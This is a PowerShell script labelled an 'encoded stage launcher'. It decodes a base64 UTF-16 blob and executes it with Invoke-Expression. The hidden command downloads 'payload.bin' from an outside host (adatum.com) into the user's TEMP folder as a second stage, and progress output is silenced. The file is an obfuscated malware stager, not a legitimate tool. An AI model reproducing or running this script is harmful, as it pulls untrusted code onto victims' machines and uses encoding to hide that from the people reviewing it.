
<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.
#>
$EncodedBlob = (
    'JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AYQBkAGEAdAB1AG0ALgBj' +
    "AG8AbQAvAGQAbwB3AG4AbABvAGEAZABzAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACIAOwAgAEkA" +
    'bgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFMAdABhAGcAZQAy' +
    'AFUAcgBsACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAdABhAGcA' +
    "ZQAyAC4AYgBpAG4AIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcA"
)
$ScriptBody = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedBlob))
try {
    Write-Verbose ("Decoded stage length: " + $ScriptBody.Length)
    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $ScriptBody
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
